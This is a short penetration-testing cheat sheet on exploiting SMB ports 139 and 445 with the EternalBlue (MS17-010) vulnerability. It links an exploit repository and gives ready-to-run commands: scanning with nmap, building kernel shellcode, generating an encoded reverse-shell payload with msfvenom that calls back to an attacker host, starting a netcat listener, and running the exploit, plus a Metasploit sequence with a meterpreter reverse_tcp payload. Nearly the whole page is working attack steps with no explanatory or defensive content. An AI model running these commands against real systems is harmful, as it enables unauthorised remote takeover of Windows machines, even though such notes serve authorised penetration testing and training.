# SMB - Ports 139,445

## Eternal Blue Remote RCE Exploit

### Manual Exploit:

{% embed data="{\"url\":\"https://github.com/worawit/MS17-010/\",\"type\":\"link\",\"title\":\"worawit/MS17-010\",\"description\":\"MS17-010\",\"icon\":{\"type\":\"icon\",\"url\":\"https://github.com/fluidicon.png\",\"aspectRatio\":0},\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"https://avatars3.githubusercontent.com/u/1352296?s=400&v=4\",\"width\":420,\"height\":420,\"aspectRatio\":1}}" %}

```text
$ nmap -p445 --script smb-vuln-* <RHOST>

$ nasm -f bin eternalblue_kshellcode_x86.asm
$ msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=443 EXITFUNC=thread -a x86 --platform windows -e x86/shikata_ga_nai -f raw -b '\x00\x0a\x0d'-o shellx86.bin 
$ cat eternalblue_kshellcode_x86 shellx86.bin > sc_x86.bin

$ nc -nlvp 443

$ python eternalblue_exploit7.py <RHOST> sc_x86.bin
```

### Exploiting with Metasploit

```text
$ msfconsole
msf> use exploit/windows/smb/ms17_010_eternalblue
msf> set RHOST <RHOST>
msf> set payload windows/meterpreter/reverse_tcp
msf> set LHOST <LHOST>
msf> set LPORT 443
msf> set VerifyArch false
msf> exploit

# exploit/windows/smb/ms17_010_psexec is also worth a shot
```

